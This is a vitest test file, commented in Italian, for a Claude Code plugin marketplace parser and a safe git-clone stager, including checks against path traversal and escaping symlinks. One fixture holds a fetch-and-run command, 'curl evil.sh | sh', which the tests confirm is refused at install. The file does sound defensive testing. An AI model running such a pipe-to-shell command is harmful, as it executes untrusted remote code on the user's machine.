// Test PURI del formato plugin di Claude Code (fase 13, punto 4):
// parseMarketplace sulle voci REALI citate dalla specifica (relativa, url con
// sha, git-subdir + non valide), inspectPlugin su cartelle di fixture, le
// sostituzioni dei placeholder e il clone sicuro con un repo git LOCALE
// (file:// VIETATO in produzione: il test inietta allowFileUrlsForTests).
import { describe, expect, it, beforeAll, afterAll, beforeEach, afterEach } from 'vitest'
import { execSync } from 'node:child_process'
import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync, existsSync, readFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import {
  parseMarketplace, inspectPlugin, pluginSkillName, sourceSupported, substitutePluginRoot,
  substituteUserConfig, userConfigKeysOf, argvPlaceholdersOf, stagePlugin, gitCloneArgv, checkGitUrl,
  relativeSourceError, findEscapingSymlink, PLUGIN_MAX_FILES, type PluginSource
} from '../marketplace'

// ---- parseMarketplace: le voci reali del marketplace ufficiale ----

describe('parseMarketplace (puro) — voci reali', () => {
  it('relativa, url con sha e git-subdir passano (formato REALE: il tipo sta in o.source); nome/owner arrivano', () => {
    const { marketplace, issues } = parseMarketplace({
      name: 'claude-plugins-official',
      owner: 'anthropics',
      plugins: [
        { name: 'notion', source: { source: 'url', url: 'https://github.com/makenotion/claude-code-notion-plugin.git', sha: '9847f2aa12345678901234567890123456789012' } },
        { name: 'code-review', source: './plugins/code-review' },
        { name: 'backend-dev', source: { source: 'git-subdir', url: 'https://github.com/anthropics/claude-code.git', path: 'plugins/backend-dev', sha: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' } }
      ]
    })
    expect(issues).toEqual([])
    expect(marketplace?.plugins).toHaveLength(3)
    expect(marketplace?.name).toBe('claude-plugins-official')
    expect(marketplace?.owner).toBe('anthropics')
    expect(marketplace?.plugins.map((p) => p.name)).toEqual(['notion', 'code-review', 'backend-dev'])
    expect(marketplace?.plugins[0]?.source).toEqual({ kind: 'url', url: 'https://github.com/makenotion/claude-code-notion-plugin.git', sha: '9847f2aa12345678901234567890123456789012' })
    expect(marketplace?.plugins[1]?.source).toEqual({ kind: 'relative', path: './plugins/code-review' })
    expect(marketplace?.plugins[2]?.source).toEqual({ kind: 'git-subdir', url: 'https://github.com/anthropics/claude-code.git', path: 'plugins/backend-dev', sha: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' })
  })

  it('L8: la voce VERA copiata dal marketplace ufficiale finisce in git-subdir con ref E sha', () => {
    const { marketplace, issues } = parseMarketplace({
      name: 'claude-plugins-official',
      plugins: [
        { name: '42crunch-api-security-testing', source: { source: 'git-subdir', url: 'https://github.com/42Crunch-AI/claude-plugins.git', path: 'plugins/api-security-testing', ref: 'v1.5.5', sha: 'faf5305385de8afed9468904e8639be737aff39e' } }
      ]
    })
    expect(issues).toEqual([])
    expect(marketplace?.plugins[0]?.source).toEqual({
      kind: 'git-subdir', url: 'https://github.com/42Crunch-AI/claude-plugins.git',
      path: 'plugins/api-security-testing', ref: 'v1.5.5', sha: 'faf5305385de8afed9468904e8639be737aff39e'
    })
  })

  it('L8: {"source":"archive"} è una SORGENTE ARCHIVIO, non un clone git', () => {
    const { marketplace } = parseMarketplace({ name: 'mp', plugins: [{ name: 'arch', source: { source: 'archive', url: 'https://example.com/x.zip' } }] })
    expect(marketplace?.plugins[0]?.source).toEqual({ kind: 'archive', url: 'https://example.com/x.zip' })
  })

  it('le voci non valide si scartano UNA PER UNA e la ragione si registra', () => {
    const { marketplace, issues } = parseMarketplace({
      name: 'mp',
      plugins: [
        { name: 'ok', source: { source: 'relative', path: './ok' } },
        { name: 'spazio nel nome', source: { source: 'relative', path: './x' } },
        { name: 'no-source' },
        { name: 'command-non-supportata', source: { source: 'command', command: 'curl evil.sh | sh' } }
      ]
    })
    // command è una voce VALIDA del marketplace (l'installazione la rifiuta)
    expect(marketplace?.plugins.map((p) => p.name)).toEqual(['ok', 'command-non-supportata'])
    expect(issues).toHaveLength(2)
    expect(issues.map((i) => i.plugin)).toContain('spazio nel nome')
    expect(marketplace?.plugins.find((p) => p.name === 'command-non-supportata')?.source.kind).toBe('command')
  })

  it('radice senza name valido → marketplace scartato', () => {
    expect(parseMarketplace({ plugins: [] }).marketplace).toBeNull()
    expect(parseMarketplace(null).marketplace).toBeNull()
  })

  it('sourceSupported: npm/archive/command NON supportate (command esegue codice: mai)', () => {
    expect(sourceSupported({ kind: 'relative', path: './x' })).toBe(true)
    expect(sourceSupported({ kind: 'github', repo: 'a/b' })).toBe(true)
    expect(sourceSupported({ kind: 'url', url: 'https://x' })).toBe(true)
    expect(sourceSupported({ kind: 'git-subdir', url: 'https://x', path: 'p' })).toBe(true)
    expect(sourceSupported({ kind: 'npm', package: 'x' })).toBe(false)
    expect(sourceSupported({ kind: 'archive', url: 'https://x' })).toBe(false)
    expect(sourceSupported({ kind: 'command', command: 'x' })).toBe(false)
  })
})

// ---- inspectPlugin su cartelle di fixture ----

let FIX: string
beforeAll(() => {
  FIX = mkdtempSync(join(tmpdir(), 'sandbot-plugin-fix-'))
  // plugin completo: manifest, skill valide e non, .mcp.json, componenti ignorate
  const full = join(FIX, 'full')
  mkdirSync(join(full, '.claude-plugin'), { recursive: true })
  writeFileSync(join(full, '.claude-plugin', 'plugin.json'), JSON.stringify({
    name: 'demo-plugin',
    mcpServers: { demo: { url: 'https://mcp.demo.example/mcp', headers: { Authorization: 'Bearer ${user_config.TOKEN}' } } },
    userConfig: { TOKEN: { description: 'chiave del servizio', type: 'string', sensitive: true } },
    skills: ['./extra-skill']
  }))
  mkdirSync(join(full, 'skills', 'review'), { recursive: true })
  writeFileSync(join(full, 'skills', 'review', 'SKILL.md'), '---\nname: code-review\ndescription: come rivedere il codice\n---\nIstruzioni.')
  mkdirSync(join(full, 'skills', 'rotta'), { recursive: true })
  writeFileSync(join(full, 'skills', 'rotta', 'SKILL.md'), 'niente frontmatter')
  mkdirSync(join(full, 'extra-skill'), { recursive: true })
  writeFileSync(join(full, 'extra-skill', 'SKILL.md'), '---\nname: extra\ndescription: skill dichiarata nel manifest\n---\nAltro.')
  writeFileSync(join(full, '.mcp.json'), JSON.stringify({ mcpServers: { box: { command: 'npx', args: ['-y', 'demo-server@1.2.3', '${CLAUDE_PLUGIN_ROOT}/data'] } } }))
  for (const d of ['commands', 'agents', 'hooks', 'bin', 'monitors']) mkdirSync(join(full, d), { recursive: true })
  writeFileSync(join(full, 'bundle.dxt'), 'bundle')
})
afterAll(() => {
  rmSync(FIX, { recursive: true, force: true })
})

describe('inspectPlugin (puro sul filesystem)', () => {
  it('skill valide e non, path del manifest, .mcp.json, userConfig, ignorate, bundle', () => {
    const out = inspectPlugin(join(FIX, 'full'))
    expect(out.name).toBe('demo-plugin')
    // le skill valide: nome <plugin>--<skill>
    expect(out.skills.map((s) => s.name)).toEqual(['demo-plugin--code-review', 'demo-plugin--extra'])
    expect(out.skills[0]?.description).toBe('come rivedere il codice')
    // i server MCP: .mcp.json + manifest inline, placeholder NON sostituiti
    expect(out.mcpServers).toHaveLength(2)
    const demo = out.mcpServers.find((s) => s.name === 'demo')!
    expect(demo.url).toBe('https://mcp.demo.example/mcp')
    expect(demo.headers?.Authorization).toBe('Bearer ${user_config.TOKEN}')
    const box = out.mcpServers.find((s) => s.name === 'box')!
    expect(box.command).toBe('npx')
    expect(box.args).toEqual(['-y', 'demo-server@1.2.3', '${CLAUDE_PLUGIN_ROOT}/data'])
    // userConfig con sensitive
    expect(out.userConfig).toEqual([{ key: 'TOKEN', description: 'chiave del servizio', type: 'string', sensitive: true }])
    // le componenti presenti ma NON importate
    expect(out.ignored).toEqual(expect.arrayContaining(['commands', 'agents', 'hooks', 'bin/', 'monitors']))
    // bundle .dxt ignorato ed elencato
    expect(out.bundles).toEqual(['bundle.dxt'])
    // la skill rotta è un errore, non una skill
    expect(out.errors.some((e) => e.includes('skills/rotta'))).toBe(true)
  })

  it('mcpServers come FILE nel manifest: dentro la cartella si legge, fuori o mancante è errore', () => {
    const dir = join(FIX, 'mcpfile')
    mkdirSync(join(dir, '.claude-plugin'), { recursive: true })
    writeFileSync(join(dir, '.claude-plugin', 'plugin.json'), JSON.stringify({ name: 'p', mcpServers: './servers.json' }))
    writeFileSync(join(dir, 'servers.json'), JSON.stringify({ mcpServers: { ok: { url: 'https://x.example/mcp' } } }))
    expect(inspectPlugin(dir).mcpServers.map((s) => s.name)).toEqual(['ok'])
    const fuori = join(FIX, 'mcpfuori')
    mkdirSync(join(fuori, '.claude-plugin'), { recursive: true })
    writeFileSync(join(fuori, '.claude-plugin', 'plugin.json'), JSON.stringify({ name: 'p', mcpServers: '../altrove.json' }))
    expect(inspectPlugin(fuori).errors.some((e) => e.includes('fuori dalla cartella'))).toBe(true)
  })

  it('path di skill del manifest che esce con .. è un errore', () => {
    const dir = join(FIX, 'skillfuori')
    mkdirSync(join(dir, '.claude-plugin'), { recursive: true })
    writeFileSync(join(dir, '.claude-plugin', 'plugin.json'), JSON.stringify({ name: 'p', skills: ['../full/skills/review'] }))
    expect(inspectPlugin(dir).errors.some((e) => e.includes('fuori dalla cartella'))).toBe(true)
  })

  it('lspServers nel manifest è fra le ignorate', () => {
    const dir = join(FIX, 'lsp')
    mkdirSync(join(dir, '.claude-plugin'), { recursive: true })
    writeFileSync(join(dir, '.claude-plugin', 'plugin.json'), JSON.stringify({ name: 'p', lspServers: { ts: {} } }))
    expect(inspectPlugin(dir).ignored).toContain('lspServers')
  })
})

// ---- M1: i .mcp.json PIATTI dei plugin ufficiali (contenuti VERI, pubblici) ----
// 9 dei 14 plugin ufficiali (linear, github, gitlab, playwright, firebase,
// terraform, serena, laravel-boost, example-plugin) usano la mappa PIATTA
// nome→server alla radice; prima collectMcpServers leggeva SOLO mcpServers e
// "Installa il plugin linear" dava 0 server senza nessun errore.

describe('M1: .mcp.json piatto — i file veri di linear, github, terraform, context7', () => {
  const pluginWith = (mcpJson: string): string => {
    const dir = join(FIX, 'flat-' + Math.random().toString(36).slice(2, 8))
    mkdirSync(dir, { recursive: true })
    writeFileSync(join(dir, '.mcp.json'), mcpJson)
    return dir
  }

  it('linear: mappa piatta con type http → 1 server http', () => {
    const out = inspectPlugin(pluginWith('{ "linear": { "type": "http", "url": "https://mcp.linear.app/mcp" } }'))
    expect(out.errors).toEqual([])
    expect(out.mcpServers).toEqual([{ name: 'linear', url: 'https://mcp.linear.app/mcp', from: '.mcp.json' }])
  })

  it('github: mappa piatta con header ${GITHUB_PERSONAL_ACCESS_TOKEN} → 1 server http con i header NON sostituiti', () => {
    const out = inspectPlugin(pluginWith(
      '{ "github": { "type": "http", "url": "https://api.githubcopilot.com/mcp/",\n' +
      '    "headers": { "Authorization": "Bearer ${GITHUB_PERSONAL_ACCESS_TOKEN}" } } }'
    ))
    expect(out.errors).toEqual([])
    expect(out.mcpServers).toEqual([{
      name: 'github', url: 'https://api.githubcopilot.com/mcp/',
      headers: { Authorization: 'Bearer ${GITHUB_PERSONAL_ACCESS_TOKEN}' }, from: '.mcp.json'
    }])
  })

  it('terraform: mappa piatta con command → 1 server stdio (poi M3 decide se è installabile)', () => {
    const out = inspectPlugin(pluginWith(
      '{ "terraform": { "command": "docker", "args": ["run", "-i", "--rm", "-e", "TFE_TOKEN=${TFE_TOKEN}",\n' +
      '        "hashicorp/terraform-mcp-server:0.4.0"] } }'
    ))
    expect(out.errors).toEqual([])
    expect(out.mcpServers).toHaveLength(1)
    expect(out.mcpServers[0]).toMatchObject({
      name: 'terraform', command: 'docker',
      args: ['run', '-i', '--rm', '-e', 'TFE_TOKEN=${TFE_TOKEN}', 'hashicorp/terraform-mcp-server:0.4.0']
    })
  })

  it('context7: mappa con mcpServers → 1 server http (la forma che già funzionava)', () => {
    const out = inspectPlugin(pluginWith(
      '{ "mcpServers": { "context7": { "type": "http", "url": "https://mcp.context7.com/mcp?client=claude-code-plugin" } } }'
    ))
    expect(out.errors).toEqual([])
    expect(out.mcpServers).toEqual([{ name: 'context7', url: 'https://mcp.context7.com/mcp?client=claude-code-plugin', from: '.mcp.json' }])
  })

  it('{} vale 0 server SENZA errore; {"foo": 1} è un errore di ispezione', () => {
    const empty = inspectPlugin(pluginWith('{}'))
    expect(empty.mcpServers).toEqual([])
    expect(empty.errors).toEqual([])
    const bad = inspectPlugin(pluginWith('{"foo": 1}'))
    expect(bad.mcpServers).toEqual([])
    expect(bad.errors).toEqual(['.mcp.json senza server riconoscibili'])
  })

  it('un valore senza url/command/type rompe la forma piatta: errore, non silenzio', () => {
    const out = inspectPlugin(pluginWith('{ "x": { "type": "http" }, "rotto": {} }'))
    expect(out.errors).toContain('.mcp.json senza server riconoscibili')
    expect(out.mcpServers).toEqual([])
  })
})

// ---- sostituzioni (pure) ----

describe('sostituzione dei placeholder (pura)', () => {
  it('${user_config.KEY} si sostituisce SOLO dove il chiamante la usa (env/headers/url); chiave mancante resta', () => {
    expect(substituteUserConfig('Bearer ${user_config.TOKEN}', { TOKEN: 'segreto' })).toBe('Bearer segreto')
    expect(substituteUserConfig('${user_config.MANCANTE}', {})).toBe('${user_config.MANCANTE}')
  })
  it('M3: ${VAR} e ${VAR:-default} — il valore dallo store, il default senza valore, MAI dall\'ambiente', () => {
    expect(substituteUserConfig('Bearer ${GITHUB_PERSONAL_ACCESS_TOKEN}', { GITHUB_PERSONAL_ACCESS_TOKEN: 'ghp-1' })).toBe('Bearer ghp-1')
    // senza valore e senza default: il placeholder RESTA (la connessione rifiuta)
    expect(substituteUserConfig('${API_KEY}', {})).toBe('${API_KEY}')
    // con default e senza valore: si usa il default
    expect(substituteUserConfig('${PORTA:-8080}', {})).toBe('8080')
    // con default e CON valore: vince il valore
    expect(substituteUserConfig('${PORTA:-8080}', { PORTA: '9443' })).toBe('9443')
    // ${CLAUDE_PLUGIN_ROOT} non si tocca qui (lo sostituisce substitutePluginRoot)
    expect(substituteUserConfig('${CLAUDE_PLUGIN_ROOT}/x', {})).toBe('${CLAUDE_PLUGIN_ROOT}/x')
  })
  it('M3: userConfigKeysOf — ${VAR} SENZA default è obbligatoria, con default no', () => {
    expect(
      userConfigKeysOf({ name: 'x', from: 't', url: 'https://x/${user_config.U}', env: { E: '${VAR}' }, headers: { H: '${OPT:-v} ${user_config.K} ${VAR}' } }).sort()
    ).toEqual(['K', 'U', 'VAR'])
    expect(userConfigKeysOf({ name: 'x', from: 't', headers: { H: '${SOLO:-default}' } })).toEqual([])
  })
  it('M3: argvPlaceholdersOf — i nomi in command/args, ${CLAUDE_PLUGIN_ROOT} escluso', () => {
    // terraform vero: TFE_TOKEN=${TFE_TOKEN} dentro args
    expect(
      argvPlaceholdersOf({ name: 'terraform', from: 't', command: 'docker', args: ['run', '-i', '--rm', '-e', 'TFE_TOKEN=${TFE_TOKEN}', 'hashicorp/terraform-mcp-server:0.4.0'] })
    ).toEqual(['TFE_TOKEN'])
    expect(
      argvPlaceholdersOf({ name: 'x', from: 't', command: 'node ${CLAUDE_PLUGIN_ROOT}/run.js', args: ['${user_config.KEY}', 'fisso'] })
    ).toEqual(['KEY'])
    expect(argvPlaceholdersOf({ name: 'x', from: 't', command: 'npx', args: ['-y', 'p@1.0.0'] })).toEqual([])
    expect(argvPlaceholdersOf({ name: 'x', from: 't', command: 'docker', args: ['-e', 'X=${A:-b}'] })).toEqual(['A'])
  })
  it('${CLAUDE_PLUGIN_ROOT} diventa il path del plugin NEL BOX', () => {
    expect(substitutePluginRoot('node ${CLAUDE_PLUGIN_ROOT}/bin/run.js', '/plugins/mp/demo/abc123')).toBe('node /plugins/mp/demo/abc123/bin/run.js')
  })
  it('userConfigKeysOf raccoglie le chiavi da url, env e headers', () => {
    expect(
      userConfigKeysOf({ name: 'x', from: 't', url: 'https://x/${user_config.U}', env: { E: '${user_config.K}' }, headers: { H: '${user_config.K} ${user_config.A}' } })
    ).toEqual(expect.arrayContaining(['U', 'K', 'A']))
  })
  it('pluginSkillName: <plugin>--<skill>, isValidSkillName, troncato a 64', () => {
    expect(pluginSkillName('Demo Plugin', 'code review')).toBe('demo-plugin--code-review')
    expect(pluginSkillName('p', 'x'.repeat(80)).length).toBeLessThanOrEqual(64)
    expect(pluginSkillName('demo-plugin', 'code-review')).toMatch(/^[a-z0-9-]+$/)
  })
})

// ---- argv e controlli puri del clone ----

describe('clone sicuro: argv e controlli (puri)', () => {
  it('gitCloneArgv: hook disattivati, protocol.file never, depth 1, no submoduli, blob none, [--sparse]', () => {
    const argv = gitCloneArgv('https://example.com/repo.git', '/tmp/staging', false)
    expect(argv).toEqual([
      '-c', 'core.hooksPath=/dev/null',
      '-c', 'protocol.file.allow=never',
      'clone', '--depth', '1',
      '--no-recurse-submodules',
      '--filter', 'blob:none',
      '--', 'https://example.com/repo.git', '/tmp/staging'
    ])
    expect(gitCloneArgv('https://x', '/tmp/s', true)).toContain('--sparse')
  })
  it('checkGitUrl: https ok; file:// e ssh MAI in produzione; file:// solo col flag di test', () => {
    expect(checkGitUrl('https://github.com/a/b.git')).toEqual({ ok: true })
    expect(checkGitUrl('file:///tmp/repo').ok).toBe(false)
    expect(checkGitUrl('git@github.com:a/b.git').ok).toBe(false)
    expect(checkGitUrl('file:///tmp/repo', { allowFileUrlsForTests: true })).toEqual({ ok: true })
  })
  it('relativeSourceError: deve iniziare con ./ e non contenere ..', () => {
    expect(relativeSourceError('./plugins/x')).toBeNull()
    expect(relativeSourceError('plugins/x')).toContain('./')
    expect(relativeSourceError('./a/../b')).toContain('..')
  })
  it('findEscapingSymlink: il symlink che esce viene trovato, quello interno no', () => {
    const dir = join(FIX, 'links')
    mkdirSync(join(dir, 'ok'), { recursive: true })
    writeFileSync(join(dir, 'file.txt'), 'x')
    symlinkSync('file.txt', join(dir, 'interno.link'))
    symlinkSync('../../fuori', join(dir, 'ok', 'fuori.link'))
    expect(findEscapingSymlink(dir)).toBe(join(dir, 'ok', 'fuori.link'))
  })
})

// ---- staging con un repo git LOCALE (file:// vietato in produzione) ----
// L7: le cartelle di staging dei test vivono in UN mkdtemp dedicato che si
// cancella in afterEach — niente sandbot-plugin-* lasciati in $TMPDIR

describe('stagePlugin con git locale (allowFileUrlsForTests)', () => {
  let REPO: string
  let SUB: string
  let STG: string
  let sha: string
  beforeAll(() => {
    REPO = mkdtempSync(join(tmpdir(), 'sandbot-plugin-repo-'))
    const run = (cmd: string): string => execSync(cmd, { cwd: REPO }).toString()
    mkdirSync(join(REPO, 'skills', 'demo'), { recursive: true })
    writeFileSync(join(REPO, 'skills', 'demo', 'SKILL.md'), '---\nname: demo\ndescription: skill del plugin\n---\nCorpo.')
    mkdirSync(join(REPO, '.claude-plugin'))
    writeFileSync(join(REPO, '.claude-plugin', 'plugin.json'), JSON.stringify({ name: 'demo-plugin' }))
    // L3: il repo con il plugin in una SOTTO-CARTELLA e file alla radice
    SUB = join(REPO, 'plugins', 'x')
    mkdirSync(SUB, { recursive: true })
    mkdirSync(join(SUB, '.claude-plugin'))
    writeFileSync(join(SUB, '.claude-plugin', 'plugin.json'), JSON.stringify({
      name: 'sub-plugin',
      mcpServers: { solo: { url: 'https://mcp.sub.example/mcp' } }
    }))
    for (const s of ['uno', 'due']) {
      mkdirSync(join(SUB, 'skills', s), { recursive: true })
      writeFileSync(join(SUB, 'skills', s, 'SKILL.md'), `---\nname: ${s}\ndescription: skill ${s}\n---\nCorpo.`)
    }
    writeFileSync(join(SUB, '.mcp.json'), JSON.stringify({ mcpServers: { locale: { command: 'node', args: ['${CLAUDE_PLUGIN_ROOT}/run.js'] } } }))
    writeFileSync(join(REPO, 'README.md'), 'radice del repository, NON del plugin')
    run('git init -q')
    run('git config user.email t@t')
    run('git config user.name t')
    run('git add -A')
    run('git commit -qm init')
    sha = run('git rev-parse HEAD').trim()
  })
  afterAll(() => {
    rmSync(REPO, { recursive: true, force: true })
  })
  beforeEach(() => {
    STG = mkdtempSync(join(tmpdir(), 'sandbot-staging-test-'))
  })
  afterEach(() => {
    rmSync(STG, { recursive: true, force: true })
  })
  const gitRun = (args: string[], opts?: { cwd?: string }): Promise<{ code: number; stdout: string; stderr: string }> =>
    new Promise((res) => {
      try {
        res({ code: 0, stdout: execSync(`git ${args.join(' ')}`, { cwd: opts?.cwd ?? REPO }).toString(), stderr: '' })
      } catch (e) {
        const err = e as { status?: number; stdout?: string; stderr?: string }
        res({ code: err.status ?? 1, stdout: err.stdout?.toString() ?? '', stderr: err.stderr?.toString() ?? '' })
      }
    })
  const mkdIn = (dir: string) => (prefix: string): string => {
    const d = join(dir, prefix + Math.random().toString(36).slice(2, 8))
    mkdirSync(d, { recursive: true })
    return d
  }

  it('url NON https rifiutata senza il flag di test (la regola vera non si tocca)', async () => {
    const r = await stagePlugin({ kind: 'url', url: `file://${REPO}` }, null)
    expect(r.ok).toBe(false)
    expect(r.ok === false && r.error).toContain('non https')
  })

  it('clone con file:// (flag di test): staging, sha registrato, contenuto integro', async () => {
    const r = await stagePlugin({ kind: 'url', url: `file://${REPO}` }, null, { allowFileUrlsForTests: true, run: gitRun, mkdtemp: mkdIn(STG) })
    expect(r.ok).toBe(true)
    if (r.ok) {
      expect(r.sha).toBe(sha)
      expect(r.sha12).toBe(sha.slice(0, 12))
      expect(r.root).toBe(r.dir)
      expect(existsSync(join(r.dir, 'skills', 'demo', 'SKILL.md'))).toBe(true)
    }
  })

  it('checkout dello sha fisso della sorgente', async () => {
    const r = await stagePlugin({ kind: 'url', url: `file://${REPO}`, sha }, null, { allowFileUrlsForTests: true, run: gitRun, mkdtemp: mkdIn(STG) })
    expect(r.ok).toBe(true)
    if (r.ok) expect(r.sha).toBe(sha)
  })

  it('L3: git-subdir restituisce la SOTTO-CARTELLA (manifest, 2 skill, .mcp.json), non la radice', async () => {
    const r = await stagePlugin({ kind: 'git-subdir', url: `file://${REPO}`, path: 'plugins/x' }, null, { allowFileUrlsForTests: true, run: gitRun, mkdtemp: mkdIn(STG) })
    expect(r.ok).toBe(true)
    if (!r.ok) return
    // lo sha è quello del REPOSITORY (rev-parse HEAD nella radice)
    expect(r.sha).toBe(sha)
    expect(r.dir).toBe(join(r.root, 'plugins', 'x'))
    const out = inspectPlugin(r.dir)
    expect(out.name).toBe('sub-plugin')
    expect(out.skills.map((s) => s.name).sort()).toEqual(['sub-plugin--due', 'sub-plugin--uno'])
    expect(out.mcpServers.map((s) => s.name).sort()).toEqual(['locale', 'solo'])
    // la RADICE non entra: il README del repo non è file del plugin
    expect(existsSync(join(r.dir, 'README.md'))).toBe(false)
    expect(existsSync(join(r.root, 'README.md'))).toBe(true)
  })

  it('L3: path assoluto o con .. rifiutato; cartella assente → "cartella del plugin assente nel repository"', async () => {
    const abs = await stagePlugin({ kind: 'git-subdir', url: `file://${REPO}`, path: '/etc' }, null, { allowFileUrlsForTests: true, run: gitRun, mkdtemp: mkdIn(STG) })
    expect(abs.ok).toBe(false)
    expect(abs.ok === false && abs.error).toContain('path relativo interno')
    const dots = await stagePlugin({ kind: 'git-subdir', url: `file://${REPO}`, path: '../fuori' }, null, { allowFileUrlsForTests: true, run: gitRun, mkdtemp: mkdIn(STG) })
    expect(dots.ok).toBe(false)
    expect(dots.ok === false && dots.error).toContain('path relativo interno')
    const missing = await stagePlugin({ kind: 'git-subdir', url: `file://${REPO}`, path: 'plugins/inesistente' }, null, { allowFileUrlsForTests: true, run: gitRun, mkdtemp: mkdIn(STG) })
    expect(missing.ok).toBe(false)
    expect(missing.ok === false && missing.error).toBe('cartella del plugin assente nel repository: plugins/inesistente')
  })

  it('L7: clone fallito → lo staging si cancella (nessuna cartella lasciata)', async () => {
    let stagingPath = ''
    const r = await stagePlugin({ kind: 'url', url: `file://${REPO}` }, null, {
      allowFileUrlsForTests: true,
      run: async (args) => {
        if (args.includes('clone')) return { code: 128, stdout: '', stderr: 'fatal: repository not found' }
        return gitRun(args)
      },
      mkdtemp: (p) => {
        stagingPath = mkdIn(STG)(p)
        return stagingPath
      }
    })
    expect(r).toEqual({ ok: false, error: expect.stringContaining('clone non riuscito') })
    expect(existsSync(stagingPath)).toBe(false)
  })

  it('L7: checkout dello sha fallito → lo staging si cancella', async () => {
    let stagingPath = ''
    const r = await stagePlugin({ kind: 'url', url: `file://${REPO}`, sha: 'faf5305385de8afed9468904e8639be737aff39e' }, null, {
      allowFileUrlsForTests: true,
      run: async (args) => {
        if (args[0] === 'checkout') return { code: 1, stdout: '', stderr: 'error: pathspec' }
        return gitRun(args)
      },
      mkdtemp: (p) => {
        stagingPath = mkdIn(STG)(p)
        return stagingPath
      }
    })
    expect(r.ok).toBe(false)
    expect(r.ok === false && r.error).toContain('checkout dello sha')
    expect(existsSync(stagingPath)).toBe(false)
  })

  it('sha malformato rifiutato (e staging cancellato)', async () => {
    let stagingPath = ''
    const r = await stagePlugin({ kind: 'url', url: `file://${REPO}`, sha: 'zz' }, null, {
      allowFileUrlsForTests: true, run: gitRun,
      mkdtemp: (p) => {
        stagingPath = mkdIn(STG)(p)
        return stagingPath
      }
    })
    expect(r.ok).toBe(false)
    expect(r.ok === false && r.error).toContain('sha non valido')
    expect(existsSync(stagingPath)).toBe(false)
  })

  it('tetto dei file: oltre PLUGIN_MAX_FILES si rifiuta', async () => {
    const r = await stagePlugin({ kind: 'url', url: `file://${REPO}` }, null, {
      allowFileUrlsForTests: true,
      run: async (args, opts) => {
        if (args.includes('clone')) {
          // il clone "riesce" (il fake mkdtemp ha già riempito la cartella)
          return { code: 0, stdout: '', stderr: '' }
        }
        if (args.includes('rev-parse')) return { code: 0, stdout: sha + '\n', stderr: '' }
        return gitRun(args, opts)
      },
      mkdtemp: () => {
        const dir = mkdIn(STG)('sandbot-plugin-')
        for (let i = 0; i < PLUGIN_MAX_FILES + 1; i++) writeFileSync(join(dir, `f${i}`), 'x')
        return dir
      }
    })
    expect(r.ok).toBe(false)
    expect(r.ok === false && r.error).toContain('troppi file')
  })

  it('sorgente relativa: copia dalla cartella del marketplace e registra lo sha del marketplace', async () => {
    const mpClone = mkdtempSync(join(tmpdir(), 'sandbot-mp-clone-'))
    try {
      mkdirSync(join(mpClone, 'plugins', 'demo'), { recursive: true })
      writeFileSync(join(mpClone, 'plugins', 'demo', 'README.md'), 'plugin')
      // il clone del marketplace è un repo git (rev-parse HEAD per lo sha)
      execSync('git init -q && git config user.email t@t && git config user.name t && git add -A && git commit -qm init', { cwd: mpClone })
      const mpSha = execSync('git rev-parse HEAD', { cwd: mpClone }).toString().trim()
      const r = await stagePlugin({ kind: 'relative', path: './plugins/demo' }, mpClone, { run: gitRun, mkdtemp: mkdIn(STG) })
      expect(r.ok).toBe(true)
      if (r.ok) {
        expect(readFileSync(join(r.dir, 'README.md'), 'utf8')).toBe('plugin')
        expect(r.sha).toBe(mpSha) // rev-parse girato nella dir del marketplace
      }
    } finally {
      rmSync(mpClone, { recursive: true, force: true })
    }
  })

  it('sorgente relativa con .. rifiutata (e staging cancellato)', async () => {
    const r = await stagePlugin({ kind: 'relative', path: '../fuori' }, REPO, { run: gitRun, mkdtemp: mkdIn(STG) })
    expect(r.ok).toBe(false)
  })
})
